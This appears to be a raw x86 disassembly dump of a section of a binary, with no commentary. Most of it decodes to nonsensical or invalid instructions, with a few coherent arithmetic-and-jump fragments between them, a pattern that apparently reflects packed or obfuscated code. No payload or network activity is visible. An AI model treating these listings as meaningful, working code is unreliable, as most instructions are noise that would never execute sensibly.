  41dc38:	sbb    DWORD PTR [esi-0x7b1f34e7],ecx
  41dc3e:	iret   
  41dc3f:	mov    al,0x75
  41dc41:	imul   ecx,ecx,0x4bcf71b1
  41dc47:	mov    ch,0x72
  41dc49:	sbb    al,0xa8
  41dc4b:	call   FWORD PTR [ecx+0x53]
  41dc4e:	push   ebp
  41dc4f:	adc    al,bl
  41dc51:	mov    dh,0x77
  41dc53:	int3   
  41dc54:	sbb    BYTE PTR [ecx-0x56],bl
  41dc57:	aas    
  41dc58:	xchg   DWORD PTR [ecx-0x21],ecx
  41dc5b:	or     BYTE PTR [ebx-0x5d],cl
  41dc5e:	adc    al,0x28
  41dc60:	call   0x9de8e7cb
  41dc65:	repnz pop edx
  41dc67:	ins    BYTE PTR es:[edi],dx
  41dc68:	push   esi
  41dc69:	xor    edx,0x30469538
  41dc6f:	jmp    0x41dd3b
  41dc74:	inc    ebp
  41dc75:	stc    
  41dc76:	ss xor al,0xbe
  41dc79:	inc    DWORD PTR [edi-0x7]
  41dc7c:	les    edi,FWORD PTR [ebx-0x2a]
  41dc7f:	cmp    ecx,edi
  41dc81:	push   edi
  41dc82:	adc    ebx,DWORD PTR [ecx-0x21]
  41dc85:	pop    edx
  41dc86:	add    DWORD PTR [eax],eax
  41dc88:	scas   eax,DWORD PTR es:[edi]
  41dc89:	add    BYTE PTR [eax],al
  41dc8b:	add    BYTE PTR [ecx+edi*2-0x5ecd5499],cl
  41dc92:	and    al,0xd
  41dc94:	mov    ebx,0x72a857bf
  41dc99:	loop   0x41dc43
  41dc9b:	lock int3 
  41dc9d:	xchg   esi,eax
  41dc9e:	in     eax,0x3b
  41dca0:	xor    eax,0x8a5ec55f
  41dca5:	mov    esp,0xb9cf3144
  41dcaa:	inc    esi
  41dcab:	adc    DWORD PTR [edx+0x4f5571fa],eax
  41dcb1:	inc    esi
  41dcb2:	dec    edx
  41dcb3:	lea    ecx,[eax-0x45e471ed]
  41dcb9:	fistp  DWORD PTR [edi]
  41dcbb:	mov    ch,BYTE PTR [eax+0x7eca68a6]
  41dcc1:	sbb    eax,0x1def7829
  41dcc6:	ja     0x41dd3c
  41dcc8:	aas    
  41dcc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcca:	xor    eax,0x3c7958a3
  41dccf:	xlat   BYTE PTR ds:[ebx]
  41dcd0:	sti    
  41dcd1:	sbb    dl,BYTE PTR [eax+0x6a5d122c]
  41dcd7:	fsub   st(3),st
  41dcd9:	outs   dx,BYTE PTR ds:[esi]
  41dcda:	out    dx,eax
  41dcdb:	scas   al,BYTE PTR es:[edi]
  41dcdc:	rol    ah,0xa4
  41dcdf:	sub    BYTE PTR [edx-0x7d0c80e6],ah
  41dce5:	pop    ds
  41dce6:	(bad)  
  41dce8:	mov    eax,ds:0xee1f0dc5
  41dced:	mov    ch,0xaa
  41dcef:	shr    DWORD PTR [ecx+0x40cccac5],0x4a
  41dcf6:	push   eax
  41dcf7:	(bad)  
  41dcf8:	shl    BYTE PTR [ecx],cl
  41dcfa:	push   ebx
  41dcfb:	cmp    ch,BYTE PTR [edi]
  41dcfd:	jl     0x41dcf8
  41dcff:	jbe    0x41dd39
  41dd01:	cs cmc 
  41dd03:	jb     0x41dd07
  41dd05:	sub    DWORD PTR [esi+0xcaf3505],esp
  41dd0b:	pop    edi
  41dd0c:	and    ebp,DWORD PTR [edi]
  41dd0e:	daa    
  41dd0f:	addr16 cli 
  41dd11:	inc    edx
  41dd12:	pusha  
  41dd13:	and    eax,0x1add8cfa
  41dd18:	test   bl,dh
  41dd1a:	mov    ebp,0xc87cea49
  41dd1f:	sub    al,0x9c
  41dd21:	push   edx
  41dd22:	(bad)  
  41dd23:	cld    
  41dd24:	addr16 jns 0x41dcbe
  41dd27:	mov    ah,BYTE PTR [eax+edi*2]
  41dd2a:	cld    
  41dd2b:	inc    edi
  41dd2c:	ins    BYTE PTR es:[edi],dx
  41dd2d:	push   es
  41dd2e:	shl    BYTE PTR [esi],cl
  41dd30:	lock dec ecx
  41dd32:	pop    eax
  41dd33:	add    bh,BYTE PTR [ebx]
  41dd35:	daa    
  41dd36:	xchg   edi,eax
  41dd37:	cwde   
  41dd38:	pop    ecx
  41dd39:	mov    bl,0x1
  41dd3b:	add    ecx,edx
  41dd3d:	mov    edx,DWORD PTR [ebp-0x2c]
  41dd40:	shr    eax,1
  41dd42:	or     eax,edx
  41dd44:	mov    edx,DWORD PTR [ebp-0x30]
  41dd47:	imul   eax,edx
  41dd4a:	xor    edx,edx
  41dd4c:	jmp    0x41de18
  41dd51:	jmp    0x41ddba
  41dd53:	adc    BYTE PTR [esi],dl
  41dd55:	pushf  
  41dd56:	ja     0x41dd47
  41dd58:	dec    DWORD PTR [ecx-0x3a]
  41dd5b:	sub    cl,BYTE PTR [esi-0x74]
  41dd5e:	cmp    DWORD PTR [eax],ebp
  41dd60:	mov    eax,ds:0x15b8e
  41dd65:	scas   eax,DWORD PTR es:[edi]
  41dd66:	add    BYTE PTR [eax],al
  41dd68:	add    dl,dl
  41dd6a:	inc    ebp
  41dd6b:	addr16 sub eax,0x3181ff36
  41dd71:	and    BYTE PTR [ebx-0x71418636],cl
  41dd77:	pop    eax
  41dd78:	test   eax,0x1e6ebdd
  41dd7d:	sub    eax,0xb1711d81
  41dd82:	cld    
  41dd83:	mov    DWORD PTR [esi-0x2b],0x93677a10
  41dd8a:	cmp    BYTE PTR [esi],al
  41dd8c:	push   es
  41dd8d:	dec    ebp
  41dd8e:	mov    ebp,0xb1960323
  41dd93:	add    eax,DWORD PTR [esi]
  41dd95:	in     al,dx
  41dd96:	sbb    al,0x49
  41dd98:	dec    ebx
  41dd99:	sbb    al,0x17
  41dd9b:	cmp    esi,DWORD PTR [eax+0x705cd98a]
  41dda1:	sub    DWORD PTR [eax+0x36],esi
  41dda4:	mov    edi,0xe0f603c5
  41dda9:	sbb    al,0x8a
  41ddab:	push   0xffffff8c
  41ddad:	add    BYTE PTR [eax+0x688ae94c],ah
  41ddb3:	test   eax,0x2079d8e5
  41ddb8:	mov    ds:0x19868cbc,al
  41ddbd:	cwde   
  41ddbe:	xchg   edx,eax
  41ddbf:	clc    
  41ddc0:	jmp    0x99f1:0xff7c1adb
  41ddc7:	cmp    eax,0xb72410d4
  41ddcc:	adc    eax,0xddadc55c
  41ddd1:	lahf   
  41ddd2:	jns    0x41ddb2
  41ddd4:	jne    0x41ddc8
  41ddd6:	stos   BYTE PTR es:[edi],al
  41ddd7:	adc    cl,bh
  41ddd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddda:	adc    ch,BYTE PTR [edx-0x7]
  41dddd:	mov    dh,BYTE PTR [eax+0x25e955dc]
  41dde3:	imul   DWORD PTR [esi-0x42cf4370]
  41dde9:	popa   
  41ddea:	xchg   ecx,eax
  41ddeb:	xchg   esp,eax
  41ddec:	sub    eax,0x357f3d2c
  41ddf1:	mov    esi,0x584d8e86
  41ddf6:	ror    BYTE PTR [ecx-0x10],1
  41ddf9:	dec    esi
  41ddfa:	jo     0x41ddd7
  41ddfc:	mov    bh,0x46
  41ddfe:	mov    edx,0xe962c7cf
  41de03:	ret    0x930a
  41de06:	jg     0x41de46
  41de08:	cld    
  41de09:	adc    BYTE PTR ss:0xf636e46d,0x5a
  41de11:	stc    
  41de12:	push   cs
  41de13:	out    0x55,eax
  41de15:	(bad)  
  41de17:	int3   
  41de18:	mov    edi,0x4abf
  41de1d:	div    edi
  41de1f:	jmp    0x41deeb
  41de24:	adc    al,0x67
  41de26:	dec    ecx
  41de27:	jo     0x41dea4
  41de29:	jle    0x41de68
  41de2b:	addr16 dec edi
  41de2d:	dec    ecx
  41de2e:	mov    esp,esp
  41de30:	mov    eax,ds:0x3d02de58
  41de35:	pop    esp
  41de36:	add    DWORD PTR [eax],eax
  41de38:	scas   eax,DWORD PTR es:[edi]
  41de39:	add    BYTE PTR [eax],al
  41de3b:	add    al,dl
  41de3d:	mov    eax,ds:0xfa2e1ee9
  41de42:	push   ds
  41de43:	jmp    0x323:0x22c26da8
  41de4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de4b:	sbb    al,0x95
  41de4d:	std    
  41de4e:	jecxz  0x41de7f
  41de50:	or     esi,DWORD PTR [ecx-0x735f0d1c]
  41de56:	fidiv  DWORD PTR ds:0x36097aff
  41de5c:	mov    bh,BYTE PTR [ebx-0x4d]
  41de5f:	ins    DWORD PTR es:[edi],dx
  41de60:	push   ebp
  41de61:	je     0x41ddf3
  41de63:	lahf   
  41de64:	xchg   ecx,eax
  41de65:	lods   al,BYTE PTR ds:[esi]
  41de66:	jmp    0xef52:0xe96079cb
  41de6d:	cdq    
  41de6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de6f:	sbb    eax,0x812400c6
  41de74:	call   0x7919:0x88c14cbe
  41de7b:	loopne 0x41de08
  41de7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de7e:	sbb    ebp,DWORD PTR [esi+0x5263761]
  41de84:	sub    ecx,ecx
  41de86:	jb     0x41de9b
  41de88:	popa   
  41de89:	push   ebp
  41de8a:	add    al,0x5
  41de8c:	pop    esp
  41de8d:	hlt    
  41de8e:	out    0xdf,eax
  41de90:	enter  0xcd21,0xa5
  41de94:	xchg   edx,eax
  41de95:	cmp    ecx,DWORD PTR [esi+0x5c24dc05]
  41de9b:	je     0x41def0
  41de9d:	jle    0x41dee3
  41de9f:	cmp    BYTE PTR [eax+0x49],bh
  41dea2:	imul   ebp,DWORD PTR [ebx-0x3db45b57],0x3e
  41dea9:	stos   DWORD PTR es:[edi],eax
  41deaa:	pop    eax
  41deab:	in     eax,0x6c
  41dead:	xor    bl,ch
  41deaf:	pop    edx
  41deb0:	mov    eax,0x25b51fba
  41deb5:	scas   eax,DWORD PTR es:[edi]
  41deb6:	es inc ebp
  41deb8:	ins    BYTE PTR es:[edi],dx
  41deb9:	nop
  41deba:	arpl   WORD PTR [eax+0x530762ed],bp
  41dec0:	bound  edi,QWORD PTR [eax]
  41dec2:	sbb    BYTE PTR [ebp+0x46],cl
  41dec5:	xchg   DWORD PTR [edi+0x16abb06a],ebx
  41decb:	in     eax,dx
  41decc:	xor    esi,esi
  41dece:	fistp  QWORD PTR [esi]
  41ded0:	rcl    BYTE PTR [ebx+edx*8],cl
  41ded3:	(bad)  
  41ded4:	push   edi
  41ded5:	push   eax
  41ded6:	cmp    dh,BYTE PTR [edx]
  41ded8:	sahf   
  41ded9:	pop    ecx
  41deda:	(bad)  
  41dedb:	jmp    0xb6fb1122
  41dee0:	(bad)  
  41dee1:	mov    ecx,0x5cba2597
  41dee6:	adc    al,0x68
  41dee8:	out    0xc,eax
  41deea:	cmc    
  41deeb:	mov    edi,ecx
  41deed:	jmp    0x41dfb9
  41def2:	mov    edx,0x9f981d20
  41def7:	mov    ebp,0xa42422bf
  41defc:	mov    ch,0x74
  41defe:	xchg   edi,eax
  41deff:	jp     0x41df5d
  41df01:	dec    esi
  41df02:	in     al,dx
  41df03:	pop    esp
  41df04:	add    DWORD PTR [eax],eax
  41df06:	scas   eax,DWORD PTR es:[edi]
  41df07:	add    BYTE PTR [eax],al
  41df09:	add    BYTE PTR [ecx+0x16e6ed84],al
  41df0f:	das    
  41df10:	js     0x41defb
  41df12:	and    ah,BYTE PTR [eax]
  41df14:	dec    ebx
  41df15:	and    eax,0xd9b16c5c
  41df1a:	bnd jnp 0x41df01
  41df1d:	mov    eax,DWORD PTR [edx-0x2f53efb6]
  41df23:	imul   edi,DWORD PTR [ebp-0xb],0xee2290ff
  41df2a:	scas   eax,DWORD PTR es:[edi]
  41df2b:	jmp    0x78b7441d
  41df30:	inc    ebp
  41df31:	pop    esp
  41df32:	lods   eax,DWORD PTR ds:[esi]
  41df33:	or     DWORD PTR [eax-0x78689527],0xffffff94
  41df3a:	ret    
  41df3b:	adc    esi,DWORD PTR [eax+0x77]
  41df3e:	(bad)  
  41df3f:	aad    0x59
  41df41:	cmp    ebx,DWORD PTR [edx+eiz*1]
  41df44:	cs cmp al,0x27
  41df47:	fsubr  st(5),st
  41df49:	call   0x5331:0x200d7733
  41df50:	ror    esp,1
  41df52:	push   0xcf5ed465
  41df57:	loopne 0x41dfc5
  41df59:	or     DWORD PTR [esp+ebx*4],0xffffffbb
  41df5d:	mov    eax,0x331e9f08
  41df62:	push   0xffffffe3
  41df64:	shl    BYTE PTR [edi],1
  41df66:	(bad)  
  41df67:	sbb    al,0x6b
  41df69:	into   
  41df6a:	pushf  
  41df6b:	imul   eax,DWORD PTR ds:0x868318d3,0xffffffca
  41df72:	arpl   sp,bx
  41df74:	es clc 
  41df76:	cmp    al,0x88
  41df78:	xchg   ecx,edi
  41df7a:	pop    ds
  41df7b:	sti    
  41df7c:	and    eax,0x5c4d498d
  41df81:	sbb    eax,edx
  41df83:	lock mov bl,0xd2
  41df86:	in     al,0x48
  41df88:	xchg   BYTE PTR [ecx-0x31],dh
  41df8b:	cdq    
  41df8c:	cmp    al,0xc8
  41df8e:	mov    eax,ds:0x7274b04d
  41df93:	pop    esp
  41df94:	push   esi
  41df95:	ror    BYTE PTR [ecx],1
  41df97:	aaa    
  41df98:	std    
  41df99:	mov    eax,ds:0x56888a48
  41df9e:	cmp    al,0xbd
  41dfa0:	mov    eax,0x734f92c3
  41dfa5:	loopne 0x41dfc6
  41dfa7:	cli    
  41dfa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfa9:	repnz sar DWORD PTR [edi],cl
  41dfac:	pop    ecx
  41dfad:	bnd ja 0x41dfda
  41dfb0:	mov    ds:0x50f408e3,al
  41dfb5:	mov    ch,ch
  41dfb7:	adc    ebx,DWORD PTR [edi]
  41dfb9:	xor    edx,edx
  41dfbb:	sub    edi,eax
  41dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  41dfc0:	sub    edi,eax
  41dfc2:	jmp    0x41e08e
  41dfc7:	data16 (bad) 
  41dfc9:	xchg   ebx,eax
  41dfca:	fstp   QWORD PTR [ebx-0x4a009103]
  41dfd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd1:	xlat   BYTE PTR ds:[ebx]
  41dfd2:	add    dl,BYTE PTR [eax]
  41dfd4:	(bad)
  41dfd8:	pop    ebp
  41dfd9:	add    DWORD PTR [eax],eax
  41dfdb:	scas   eax,DWORD PTR es:[edi]
  41dfdc:	add    BYTE PTR [eax],al
  41dfde:	add    BYTE PTR [edi-0x245532bf],ah
  41dfe4:	enter  0x5499,0x5
  41dfe8:	jge    0x41dfde
  41dfea:	outs   dx,BYTE PTR ds:[esi]
  41dfeb:	shr    BYTE PTR [ebp+0x41cdc0c7],cl
  41dff1:	push   cs
  41dff2:	call   0x31ed3e95
  41dff7:	mov    ebx,0x2847ad75
  41dffc:	sub    DWORD PTR [esi],esp
  41dffe:	mov    ds:0x1e262db1,eax
  41e003:	in     al,dx
  41e004:	xchg   edx,eax
  41e005:	xchg   BYTE PTR [ecx+0x15],dh
  41e008:	sar    esi,0x27
  41e00b:	mov    esi,0xad1cf366
  41e010:	lds    esp,FWORD PTR [edi+ebp*8-0x6b]
  41e014:	ret    
  41e015:	outs   dx,DWORD PTR ds:[esi]
  41e016:	push   edi
  41e017:	dec    esi
  41e018:	push   esp
  41e019:	or     esi,edi
  41e01b:	inc    esp
  41e01c:	rcl    edi,0xd2
  41e01f:	cmc    
  41e020:	adc    BYTE PTR [edi],0x1a
  41e023:	popa   
  41e024:	jnp    0x41dfab
  41e026:	pushf  
  41e027:	push   esi
  41e028:	in     eax,0x1e
  41e02a:	and    BYTE PTR [ebx+0x32],dl
  41e02d:	jnp    0x41e038
  41e02f:	or     cl,BYTE PTR [ebp+0x2296b6df]
  41e035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e036:	jnp    0x41e0b7
  41e038:	or     DWORD PTR [ebx+0x48fe3fd8],esp
  41e03e:	ja     0x41e053
  41e040:	mov    DWORD PTR [ebp+0x731c2bb2],edx
  41e046:	out    0xc2,eax
  41e048:	jb     0x41e04b
  41e04a:	xchg   cx,ax
  41e04c:	jnp    0x41e00a
  41e04e:	das    
  41e04f:	ds and al,0xe6
  41e052:	sbb    al,0xb5
  41e054:	pop    edi
  41e055:	(bad)  
  41e056:	xchg   edi,eax
  41e057:	mov    bh,0x8c
  41e059:	jmp    0x4e38:0xd5e98cc6
  41e060:	setge  BYTE PTR [edx]
  41e063:	ror    ebx,0xfa
  41e066:	adc    ecx,DWORD PTR [eax+0x5c3c4161]
  41e06c:	or     ebx,edi
  41e06e:	ret    0x1430
  41e071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e072:	aad    0x6b
  41e074:	sub    ecx,esp
  41e076:	sub    al,0xfd
  41e078:	mov    edx,0xf7d50912
  41e07d:	out    dx,al
  41e07e:	fidiv  DWORD PTR [edi+0x5b]
  41e081:	push   ecx
  41e082:	scas   al,BYTE PTR es:[edi]
  41e083:	inc    ecx
  41e084:	cmc    
  41e085:	dec    eax
  41e086:	ins    BYTE PTR es:[edi],dx
  41e087:	test   eax,0xf60da675
  41e08c:	int    0xa5
  41e08e:	mov    eax,DWORD PTR [ebp-0x38]
  41e091:	imul   eax,eax,0x65d2
  41e097:	div    ebx
  41e099:	mov    edx,DWORD PTR [ebp-0x3c]
  41e09c:	add    edi,0x6d14
  41e0a2:	lea    eax,[eax+edx*1+0x132a]
  41e0a9:	jmp    0x41e175
  41e0ae:	xor    esp,ebx
  41e0b0:	div    BYTE PTR [eax]
  41e0b2:	div    BYTE PTR ds:0xfcbce3f7
  41e0b8:	xor    ah,ah
  41e0ba:	retf   
  41e0bb:	adc    DWORD PTR ds:0x15e4a02,ebx
  41e0c1:	add    BYTE PTR [edi+0x11000000],ch
  41e0c7:	in     eax,dx
  41e0c8:	dec    ecx
  41e0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0ca:	sub    eax,0xc20cfa1a
  41e0cf:	pop    edi
  41e0d0:	inc    esp
  41e0d1:	(bad)
  41e0d4:	pushf  
  41e0d5:	dec    edx
  41e0d6:	(bad)  
  41e0d7:	(bad)  
  41e0d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0d9:	add    BYTE PTR [edx],al
  41e0db:	dec    ebp
  41e0dc:	mov    ds:0x4122b5ad,al
  41e0e1:	aam    0x17
  41e0e3:	xor    al,0x31
  41e0e5:	data16 test BYTE PTR [ecx],ch
  41e0e8:	and    BYTE PTR [edx+0x3384c554],al
  41e0ee:	cld    
  41e0ef:	dec    esp
  41e0f0:	sahf   
  41e0f1:	aam    0x23
  41e0f3:	ss in  eax,dx
  41e0f5:	(bad)  
  41e0f6:	mov    ds:0xdea8cabf,eax
  41e0fb:	and    al,0x53
  41e0fd:	inc    esp
  41e0fe:	daa    
  41e0ff:	dec    eax
  41e100:	or     eax,0xc0533286
  41e105:	sar    BYTE PTR [edx+0x4423a7aa],cl
  41e10b:	scas   ax,WORD PTR es:[edi]
  41e10d:	mov    ds:0xaea3babb,eax
  41e112:	pop    edi
  41e113:	cmp    al,0xd5
  41e115:	sub    DWORD PTR [edx-0x4e01574e],0x76
  41e11c:	xchg   ebx,eax
  41e11d:	push   ss
  41e11e:	ficom  WORD PTR [ebx+esi*4+0x182162b6]
  41e125:	fidiv  DWORD PTR [ebp+0xa]
  41e128:	mov    ?,edx
  41e12a:	shl    BYTE PTR [edx-0x57150f9f],0xf9
  41e131:	mov    ebx,0x299540dc
  41e136:	mov    ecx,0x27c8e666
  41e13b:	mov    edx,0x12202d40
  41e140:	in     al,dx
  41e141:	add    al,0x73
  41e143:	push   eax
  41e144:	jge    0x41e150
  41e146:	inc    edi
  41e147:	dec    edx
  41e148:	sub    al,0x4c
  41e14a:	out    dx,eax
  41e14b:	cld    
  41e14c:	xchg   DWORD PTR [esi+0x55],edi
  41e14f:	xor    ecx,ecx
  41e151:	jb     0x41e102
  41e153:	pushf  
  41e154:	push   es
  41e155:	inc    esp
  41e156:	sub    DWORD PTR [ebp+0x37],esp
  41e159:	mov    esp,0x3648ad4a
  41e15e:	out    0x2e,eax
  41e160:	popf   
  41e161:	scas   al,BYTE PTR es:[edi]
  41e162:	(bad)  
  41e163:	in     eax,dx
  41e164:	mov    edx,0x3b5ff41c
  41e169:	pusha  
  41e16a:	hlt    
  41e16b:	adc    ecx,ebx
  41e16d:	push   ebp
  41e16e:	(bad)  
  41e16f:	out    dx,al
  41e170:	sub    al,0x24
  41e172:	cli    
  41e173:	cmp    BYTE PTR [edi-0x16efaa75],0xc7
  41e17a:	add    BYTE PTR [eax],al
  41e17c:	add    BYTE PTR [ebp+0x75],al
  41e17f:	or     ah,dh
  41e181:	cmp    bh,bh
  41e183:	in     eax,dx
  41e184:	div    esi
  41e186:	xchg   edx,eax
  41e187:	cdq    
  41e188:	cmp    DWORD PTR [edx-0x45],edi
  41e18b:	mov    al,ds:0x15ef9c3
  41e190:	add    BYTE PTR [edi-0x73000000],ch
  41e196:	pop    edx
  41e197:	pushf  
  41e198:	jmp    0x3e024dc1
  41e19d:	imul   ebp,eax,0xbd69b9d1
  41e1a3:	dec    ebp
  41e1a4:	scas   eax,DWORD PTR es:[edi]
  41e1a5:	mov    bh,0xfc
  41e1a7:	out    0xa4,al
  41e1a9:	xchg   ebx,eax
  41e1aa:	inc    edi
  41e1ab:	jmp    0xe4ad2b1b
  41e1b0:	adc    eax,0x27e5608c
  41e1b5:	pop    edx
  41e1b6:	mov    edi,0x5009feca
  41e1bb:	ret    0x8c7a
  41e1be:	mov    ss,edi
  41e1c0:	imul   ebp,DWORD PTR [eax+eax*2-0x7871b95c],0xffffffe9
  41e1c8:	jp     0x41e1f2
  41e1ca:	stos   BYTE PTR es:[edi],al
  41e1cb:	jns    0x41e1c5
  41e1cd:	sub    ebx,DWORD PTR [eax+0x29]
  41e1d0:	stos   BYTE PTR es:[edi],al
  41e1d1:	or     BYTE PTR [edx-0x34],ch
  41e1d4:	sbb    eax,0xf8f84f01
  41e1d9:	loope  0x41e231
  41e1db:	jl     0x41e196
  41e1dd:	sbb    DWORD PTR ds:0x9de416e,eax
  41e1e3:	test   cl,ch
  41e1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1e6:	(bad)  
  41e1e7:	and    cl,ch
  41e1e9:	aaa    
  41e1ea:	imul   ebx,DWORD PTR [esi],0x75
  41e1ed:	jnp    0x41e241
  41e1ef:	addr16 jmp 0xc406e273
  41e1f5:	(bad)  
  41e1f6:	cmp    edi,edx
  41e1f8:	jmp    0xc789:0xa0be2cd3
  41e1ff:	je     0x41e21f
  41e201:	mov    ch,cl
  41e203:	leave  
  41e204:	nop
  41e205:	xchg   esp,eax
  41e206:	test   ah,cl
  41e208:	lods   al,BYTE PTR ds:[esi]
  41e209:	(bad)  
  41e20a:	retf   
  41e20b:	jns    0x41e1f2
  41e20d:	mov    edx,0xfe9befd3
  41e212:	inc    ecx
  41e213:	xchg   ebp,eax
  41e214:	mov    esi,0xf184e11
  41e219:	sub    al,0x6c
  41e21b:	ror    BYTE PTR [ebp+eiz*4-0x78],cl
  41e21f:	jne    0x41e1d7
  41e221:	retf   
  41e222:	mov    esp,0xc1174f91
  41e227:	outs   dx,BYTE PTR ds:[esi]
  41e228:	jp     0x41e258
  41e22a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e22b:	mov    eax,ds:0xa801ef8
  41e230:	adc    al,0x5f
  41e232:	xchg   BYTE PTR ss:[esi-0x52],bh
  41e236:	test   dh,bl
  41e238:	mov    ah,0xf7
  41e23a:	fcmovnu st,st(4)
  41e23c:	hlt    
  41e23d:	fdiv   DWORD PTR [edx+ebx*1-0x26]
  41e241:	jne    0x41e1f5
  41e243:	mov    ds:0x8f2535,eax
  41e248:	add    BYTE PTR [ebx],ch
  41e24a:	shr    cl,1
  41e24c:	mov    DWORD PTR [eax],0x4f230000
  41e252:	rcr    DWORD PTR [edx-0x846113],0xcf
  41e259:	jmp    0x1b338232
  41e25e:	int    0xa1
  41e260:	test   al,0x5f
  41e262:	add    DWORD PTR [eax],eax
  41e264:	scas   eax,DWORD PTR es:[edi]
  41e265:	add    BYTE PTR [eax],al
  41e267:	add    bl,bh
  41e269:	cdq    
  41e26a:	(bad)  
  41e26b:	mov    esp,DWORD PTR [eax-0x5b]
  41e26e:	fisttp DWORD PTR [ebx*4+0x17e7c5a2]
  41e275:	jns    0x41e2d6
  41e277:	push   es
  41e278:	jae    0x41e299
  41e27a:	loope  0x41e201
  41e27c:	xchg   ecx,eax
  41e27d:	mov    ah,0xb2
  41e27f:	mov    bl,0x60
  41e281:	les    ebp,FWORD PTR [ecx]
  41e283:	arpl   WORD PTR [edi+ebx*2-0x2f],dx
  41e287:	xor    eax,0x31eb9e0b
  41e28c:	mov    dl,0x65
  41e28e:	(bad)  
  41e28f:	jmp    0x97c7:0x8e36f2dd
  41e296:	mov    esi,DWORD PTR ds:0x3e775245
  41e29c:	cmc    
  41e29d:	sbb    BYTE PTR [edi+0x7d5f07af],dl
  41e2a3:	data16 mov al,0x18
  41e2a6:	fldcw  WORD PTR [ebx]
  41e2a8:	(bad)  
  41e2a9:	iret   
  41e2aa:	xchg   ecx,eax
  41e2ab:	push   ecx
  41e2ac:	inc    esi
  41e2ad:	add    al,0x8c
  41e2af:	push   eax
  41e2b0:	jecxz  0x41e29e
  41e2b2:	cmp    edi,DWORD PTR [ecx]
  41e2b4:	retf   
  41e2b5:	mov    ds:0x1a3d935a,al
  41e2ba:	jp     0x41e23f
  41e2bc:	lods   al,BYTE PTR ds:[esi]
  41e2bd:	jecxz  0x41e32d
  41e2bf:	mov    al,ds:0xa86bd4c4
  41e2c4:	mov    ecx,0x16522f03
  41e2c9:	or     esp,ecx
  41e2cb:	xchg   edx,eax
  41e2cc:	mov    cs:0xf5d3d1bd,al
  41e2d2:	pop    ebp
  41e2d3:	in     eax,dx
  41e2d4:	(bad)  
  41e2d5:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41e2d7:	mov    esi,0xe2d2e39
  41e2dc:	cld    
  41e2dd:	iret   
  41e2de:	lods   al,BYTE PTR ds:[esi]
  41e2df:	or     ebp,edx
  41e2e1:	inc    edx
  41e2e2:	xchg   ecx,ebx
  41e2e4:	loopne 0x41e26e
  41e2e6:	dec    ebp
  41e2e7:	pop    edx
  41e2e8:	aam    0x7e
  41e2ea:	jp     0x41e310
  41e2ec:	mov    ecx,0x4c89aaf4
  41e2f1:	add    cl,cl
  41e2f3:	adc    edi,DWORD PTR [eax]
  41e2f5:	retf   0x366f
  41e2f8:	cmp    eax,0x7111c6d7
  41e2fd:	pop    edi
  41e2fe:	hlt    
  41e2ff:	jo     0x41e2dd
  41e301:	sbb    ch,BYTE PTR [eax]
  41e303:	test   eax,0x840431db
  41e308:	div    dl
  41e30a:	ins    DWORD PTR es:[edi],dx
  41e30b:	xchg   esi,eax
  41e30c:	out    0x1f,eax
  41e30e:	nop
  41e30f:	add    esi,esi
  41e311:	and    ebx,DWORD PTR [ecx+0x242e4d59]
  41e317:	cmp    edi,edx
  41e319:	jbe    0x41d4b7
  41e31f:	jmp    0x41e3eb
  41e324:	les    edx,FWORD PTR [edi+ebx*8]
  41e327:	rcr    bh,0xcb
  41e32a:	fist   WORD PTR [esi+esi*4]
  41e32d:	ins    DWORD PTR es:[edi],dx
  41e32e:	fcom   QWORD PTR [edx+0x3ff03b23]
  41e334:	push   edi
  41e335:	pusha  
  41e336:	add    DWORD PTR [eax],eax
  41e338:	scas   eax,DWORD PTR es:[edi]
  41e339:	add    BYTE PTR [eax],al
  41e33b:	add    BYTE PTR ds:0x13377102,bh
  41e341:	inc    ebp
  41e342:	push   0xebc3973
  41e347:	add    eax,0x8c54599e
  41e34c:	or     eax,0x5ddf57c5
  41e351:	call   0xd0334058
  41e356:	xor    BYTE PTR [ecx-0x5e6c1281],dl
  41e35c:	dec    ebp
  41e35d:	sub    ecx,esp
  41e35f:	imul   edx,DWORD PTR fs:[esi-0x2a7b62f0],0xdc456bac
  41e36a:	xchg   ebp,eax
  41e36b:	ficomp DWORD PTR [edi]
  41e36d:	cmp    dl,dh
  41e36f:	into   
  41e370:	sbb    ecx,DWORD PTR [ebp+0x444599db]
  41e376:	emms   
  41e378:	(bad)  
  41e37a:	pop    ds
  41e37b:	aam    0x29
  41e37d:	dec    esi
  41e37e:	pop    es
  41e37f:	sub    BYTE PTR [edx+0x8],0x87
  41e383:	dec    ebx
  41e384:	inc    ebx
  41e385:	add    bl,BYTE PTR [bx-0x13fb]
  41e38a:	std    
  41e38b:	adc    eax,0x8f09c9b4
  41e390:	test   DWORD PTR [edi-0x7c],0x29826ca1
  41e397:	ins    BYTE PTR es:[edi],dx
  41e398:	pop    ds
  41e399:	sbb    eax,0xe43c8704
  41e39e:	mov    dl,0x74
  41e3a0:	nop
  41e3a1:	lock iret 
  41e3a3:	in     al,0xb3
  41e3a5:	and    bh,BYTE PTR [edi+esi*4-0x47]
  41e3a9:	(bad)  
  41e3aa:	jmp    0x562f:0x329b5c80
  41e3b1:	cmp    bl,al
  41e3b3:	lahf   
  41e3b4:	ins    BYTE PTR es:[edi],dx
  41e3b5:	inc    ecx
  41e3b6:	ins    BYTE PTR es:[edi],dx
  41e3b7:	scas   eax,DWORD PTR es:[edi]
  41e3b8:	pmuludq mm7,QWORD PTR [ebx]
  41e3bb:	sbb    eax,0xf56ed055
  41e3c0:	push   es
  41e3c1:	adc    esi,0x39
  41e3c4:	jmp    0x33c1dc7d
  41e3c9:	add    BYTE PTR [edi+0x519537ad],bh
  41e3cf:	cmp    edx,edi
  41e3d1:	mov    edx,esp
